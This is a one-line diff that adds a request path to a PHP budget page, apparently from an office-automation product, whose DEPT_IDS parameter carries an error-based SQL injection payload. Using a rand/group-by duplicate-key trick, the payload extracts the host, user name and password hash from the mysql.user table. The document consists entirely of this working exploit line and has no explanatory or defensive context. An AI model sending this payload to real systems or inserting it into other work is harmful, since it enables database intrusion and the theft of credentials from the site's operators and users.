@@ -1,0 +1,1 @@
+/general/budget/budget_process/budget_year_depts.php?DEPT_ID=1&DEPT_ID_PRIV=0&DEPT_IDS=1) and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#)&YEAR=2015
